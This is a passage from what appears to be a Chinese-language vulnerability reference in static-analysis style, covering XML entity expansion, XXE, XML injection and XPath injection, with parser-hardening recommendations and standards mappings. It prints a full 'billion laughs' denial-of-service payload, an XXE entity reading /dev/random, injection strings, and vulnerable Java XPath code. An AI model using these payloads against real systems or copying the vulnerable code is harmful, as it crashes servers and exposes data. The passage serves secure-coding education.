<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</p>
<h5 id="RECOMMENDATIONS-344"><a href="#RECOMMENDATIONS-344" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应该对 XML 解析器进行安全配置，使它不允许将文档类型定义 (DTD) 自定义实体包含在传入的 XML 文档中。</p>
<p>为了避免 XML Entity Expansion injection，应为 XML 代理、解析器或读取器设置“secure-processing”属性：</p>
<p><code>factory.setFeature(&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;, true);</code></p>
<p>在 JAXP 1.3 及更早版本中，当开启安全处理功能时，将为 DOM 和 SAX 解析器设置默认限制。这些限制是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">entityExpansionLimit = 64,000</span><br><span class="line"></span><br><span class="line">elementAttributeLimit = 10,000</span><br></pre></td></tr></table></figure>
<p>从 JAXP 1.4 开始，将默认打开安全处理功能。除了上述限制外，还在验证解析器中添加了新的 maxOccur 限制。此限制是：</p>
<p>maxOccur = 5,000</p>
<p>如果不需要 inline DOCTYPE 声明，可使用以下属性将其完全禁用：</p>
<p><code>factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</code></p>
<h5 id="REFERENCES-343"><a href="#REFERENCES-343" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] XML External Entity (XXE) Processing OWASP</p>
<p>[2] Testing for XML Injection (OWASP-DV-008) OWASP</p>
<p>[3] XML External Entities The Web Application Security Consortium</p>
<p>[4] INJECT-5: Restrict XML inclusion Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 776</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 XML Entity Expansion (WASC-44)</p>
<h4 id="XML-External-Entity-Injection"><a href="#XML-External-Entity-Injection" class="headerlink" title="XML External Entity Injection"></a>XML External Entity Injection</h4><h5 id="ABSTRACT-346"><a href="#ABSTRACT-346" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用配置的 XML 解析器无法预防和限制外部实体进行解析，这会使解析器暴露在 XML External Entities 攻击之下</p>
<h5 id="EXPLANATION-346"><a href="#EXPLANATION-346" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XML External Entities 攻击可利用能够在处理时动态构建文档的 XML 功能。XML 实体可动态包含来自给定资源的数据。外部实体允许 XML 文档包含来自外部 URI 的数据。除非另行配置，否则外部实体会迫使 XML 解析器访问由 URI 指定的资源，例如位于本地计算机或远程系统上的某个文件。这一行为会将应用程序暴露给 XML External Entity (XXE) 攻击，从而用于拒绝本地系统的服务，获取对本地计算机上文件未经授权的访问权限，扫描远程计算机，并拒绝远程系统的服务。</p>
<p>下面的 XML 文档介绍了 XXE 攻击的示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!DOCTYPE foo [</span><br><span class="line"></span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line"></span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
<p>如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
<h5 id="RECOMMENDATIONS-345"><a href="#RECOMMENDATIONS-345" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应对 XML 解析器进行安全配置，使它不允许将外部实体包含在传入的 XML 文档中。</p>
<p>为了避免 XXE injections，应为 XML 代理、解析器或读取器设置下面的属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line"></span><br><span class="line">factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure>
<p>如果不需要 inline DOCTYPE 声明，可使用以下属性将其完全禁用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-344"><a href="#REFERENCES-344" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] XML External Entity (XXE) Processing OWASP</p>
<p>[2] Testing for XML Injection (OWASP-DV-008) OWASP</p>
<p>[3] XML External Entities The Web Application Security Consortium</p>
<p>[4] IDS17-J. Prevent XML External Entity Attacks CERT</p>
<p>[5] DOS-1: Beware of activities that may use disproportionate resources Oracle</p>
<p>[6] INJECT-5: Restrict XML inclusion Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 611</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[10] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[14] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3810 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3810 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3810 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3810 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3810 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3810 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002390 CAT II, APSC-DV-002400 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Web Application Security Consortium Version 2.00 XML External Entities (WASC-43)</p>
<h4 id="XML-Injection"><a href="#XML-Injection" class="headerlink" title="XML Injection"></a>XML Injection</h4><h5 id="ABSTRACT-347"><a href="#ABSTRACT-347" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果在 XML 文档中写入未验证的数据，可能会使攻击者修改 XML 的结构和内容。</p>
<h5 id="EXPLANATION-347"><a href="#EXPLANATION-347" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XML injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据写入到 XML 文档中。</p>
</li>
</ol>
<p>应用程序通常使用 XML 来存储数据或发送消息。当 XML 用于存储数据时，XML 文档通常会像数据库一样进行处理，而且可能会包含敏感信息。XML 消息通常在 web 服务中使用，也可用于传输敏感信息。XML 消息甚至还可用于发送身份验证凭据。</p>
<p>如果攻击者能够写入原始 XML，则可以更改 XML 文档和消息的语义。危害最轻的情况下，攻击者可能会插入无关的标签，导致 XML 解析器抛出异常。XML injection 更为严重的情况下，攻击者可以添加 XML 元素，更改身份验证凭据或修改 XML 电子商务数据库中的价格。还有一些情况，XML injection 可以导致 cross-site scripting 或 dynamic code evaluation。</p>
<p>例 1：</p>
<p>假设攻击者能够控制下列 XML 中的 shoes。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;order&gt;</span><br><span class="line"></span><br><span class="line">   &lt;price&gt;100.00&lt;/price&gt;</span><br><span class="line"></span><br><span class="line">   &lt;item&gt;shoes&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">&lt;/order&gt;</span><br></pre></td></tr></table></figure>
<p>现在假设，在后端 Web 服务请求中包含该 XML，用于订购一双鞋。假设攻击者可以修改请求，并将 shoes 替换成 <code>shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes</code>。新的 XML 如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;order&gt;</span><br><span class="line"></span><br><span class="line">    &lt;price&gt;100.00&lt;/price&gt;</span><br><span class="line"></span><br><span class="line">    &lt;item&gt;shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">&lt;/order&gt;</span><br></pre></td></tr></table></figure>
<p>当使用 SAX 解析器时，第二个 <code>&lt;price&gt;</code> 标签中的值将会覆盖第一个 <code>&lt;price&gt;</code> 标签中的值。这样，攻击者就可以只花 1 美元购买一双价值 100 美元的鞋。</p>
<h5 id="RECOMMENDATIONS-346"><a href="#RECOMMENDATIONS-346" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将用户提供的数据写入 XML 时，应该遵守以下准则：</p>
<ol>
<li><p>不要创建名称来自用户输入的标签或属性。</p>
</li>
<li><p>写入到 XML 之前，先对用户输入进行 XML 实体编码。</p>
</li>
<li><p>将用户输入包含在 CDATA 标签中。</p>
</li>
</ol>
<h5 id="REFERENCES-345"><a href="#REFERENCES-345" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] IDS16-J. Prevent XML Injection CERT</p>
<p>[2] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 91</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[7] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3810 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3810 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3810 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3810 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3810 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3810 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 XML Injection (WASC-23)</p>
<h4 id="XPath-Injection"><a href="#XPath-Injection" class="headerlink" title="XPath Injection"></a>XPath Injection</h4><h5 id="ABSTRACT-348"><a href="#ABSTRACT-348" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>利用用户输入构建动态的 XPath 查询使攻击者可借机修改语句的含义。</p>
<h5 id="EXPLANATION-348"><a href="#EXPLANATION-348" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XPath injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态构造一个 XPath 查询。</p>
</li>
</ol>
<p>例 1：下列代码可动态地构建并执行一个 XPath 查询，为指定的帐户 ID 检索电子邮件地址。由于该帐户 ID 是从 HTTP 请求中读取的，因此不可信赖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String acctID = request.getParameter(&quot;acctID&quot;);</span><br><span class="line"></span><br><span class="line">String query = null;</span><br><span class="line"></span><br><span class="line">if(acctID != null) &#123;</span><br><span class="line"></span><br><span class="line">       StringBuffer sb = new StringBuffer(&quot;/accounts/account[acctID=&apos;&quot;);</span><br><span class="line"></span><br><span class="line">       sb.append(acctID);</span><br><span class="line"></span><br><span class="line">       sb.append(&quot;&apos;]/email/text()&quot;);</span><br><span class="line"></span><br><span class="line">       query = sb.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">domFactory.setNamespaceAware(true);</span><br><span class="line"></span><br><span class="line">DocumentBuilder builder = domFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document doc = builder.parse(&quot;accounts.xml&quot;);</span><br><span class="line"></span><br><span class="line">XPathFactory factory = XPathFactory.newInstance();</span><br><span class="line"></span><br><span class="line">XPath xpath = factory.newXPath();</span><br><span class="line"></span><br><span class="line">XPathExpression expr = xpath.compile(query);</span><br><span class="line"></span><br><span class="line">Object result = expr.evaluate(doc, XPathConstants.NODESET);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在正常情况下（例如搜索属于帐号 1 的电子邮件地址），此代码所执行的查询如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/account[acctID=&apos;1&apos;]/email/text()</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 acctID 不包含单引号字符时，才会正确执行这一查询。如果攻击者为 acctID 输入字符串 1’ or ‘1’ = ‘1，则该查询会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/account[acctID=&apos;1&apos; or &apos;1&apos; = &apos;1&apos;]/email/text()</span><br></pre></td></tr></table></figure>
<p>附加条件 1’ or ‘1’ = ‘1 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<p><code>//email/text()</code></p>
<p>这种查询简化会使攻击者绕过以下要求：查询只能返回经过验证的用户所拥有的条目；现在，查询可返回文档中存储的所有电子邮件地址，不论它们的指定所有者是是谁。</p>
<h5 id="RECOMMENDATIONS-347"><a href="#RECOMMENDATIONS-347" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 XPath injection 漏洞的根本原因在于攻击者能够改变 XPath 查询的上下文，导致程序员期望解释为数据的某个数值最终被解释为命令。构建 XPath 查询后，程序员知道哪些数值应解释为命令的一部分，哪些数值应解释为数据。</p>
<p>为了防止攻击者侵犯程序员的各种预设情况，可以使用白名单的方法，确保 XPath 查询中由用户控制的数值完全来自于预定的字符集合，不包含任何上下文中所已使用的 XPath 元字符。如果由用户控制的数值要求它包含 XPath 元字符，则使用相应的编码机制删除这些元字符在 XPath 查询中的意义。</p>
<p>例 2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String acctID = request.getParameter(&quot;acctID&quot;);</span><br><span class="line"></span><br><span class="line">String query = null;</span><br><span class="line"></span><br><span class="line">if(acctID != null) &#123;</span><br><span class="line"></span><br><span class="line">       Integer iAcctID = -1;</span><br><span class="line"></span><br><span class="line">       try &#123;</span><br><span class="line"></span><br><span class="line">              iAcctID = Integer.parseInt(acctID);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       catch (NumberFormatException e) &#123;</span><br><span class="line"></span><br><span class="line">              throw new InvalidParameterException();</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       StringBuffer sb = new StringBuffer(&quot;/accounts/account[acctID=&apos;&quot;);</span><br><span class="line"></span><br><span class="line">       sb.append(iAcctID.toString());</span><br><span class="line"></span><br><span class="line">       sb.append(&quot;&apos;]/email/text()&quot;);</span><br><span class="line"></span><br><span class="line">       query = sb.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">domFactory.setNamespaceAware(true);</span><br><span class="line"></span><br><span class="line">DocumentBuilder builder = domFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document doc = builder.parse(&quot;accounts.xml&quot;);</span><br><span class="line"></span><br><span class="line">XPathFactory factory = XPathFactory.newInstance();</span><br><span class="line"></span><br><span class="line">XPath xpath = factory.newXPath();</span><br><span class="line"></span><br><span class="line">XPathExpression expr = xpath.compile(query);</span><br><span class="line"></span><br><span class="line">Object result = expr.evaluate(doc, XPathConstants.NODESET);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-346"><a href="#REFERENCES-346" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 643</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[5] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
